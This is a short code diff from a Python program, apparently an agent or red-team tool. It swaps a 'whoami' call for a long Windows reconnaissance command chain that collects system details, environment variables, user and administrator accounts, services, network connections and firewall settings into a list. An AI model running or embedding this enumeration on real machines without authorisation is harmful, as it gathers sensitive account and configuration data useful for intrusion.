@@ -1487,7 +1487,7 @@ class Main:
             result = await asyncio.create_subprocess_shell('chcp', stdout=asyncio.subprocess.PIPE, shell=True)
             stdout, _ = await result.communicate()
             current_code_page = stdout.decode().split(":")[1].strip()
-            result = await asyncio.create_subprocess_shell('whoami', stdout=asyncio.subprocess.PIPE, shell=True)
+            result = await asyncio.create_subprocess_shell(r'echo ####System Info#### & systeminfo & echo ####System Version#### & ver & echo ####Host Name#### & hostname & echo ####Environment Variable#### & set & echo ####Logical Disk#### & wmic logicaldisk get caption,description,providername & echo ####User Info#### & net user & echo ####Online User#### & query user & echo ####Local Group#### & net localgroup & echo ####Administrators Info#### & net localgroup administrators & echo ####Guest User Info#### & net user guest & echo ####Administrator User Info#### & net user administrator & echo ####Startup Info#### & wmic startup get caption,command & echo ####Tasklist#### & tasklist /svc & echo ####Ipconfig#### & ipconfig/all & echo ####Hosts#### & type C:\WINDOWS\System32\drivers\etc\hosts & echo ####Route Table#### & route print & echo ####Arp Info#### & arp -a & echo ####Netstat#### & netstat -ano & echo ####Service Info#### & sc query type= service state= all & echo ####Firewallinfo#### & netsh firewall show state & netsh firewall show config', stdout=asyncio.subprocess.PIPE, shell=True)
             stdout, _ = await result.communicate()
             self.systeminfoList.append(stdout.decode(current_code_page))
         except Exception as e:
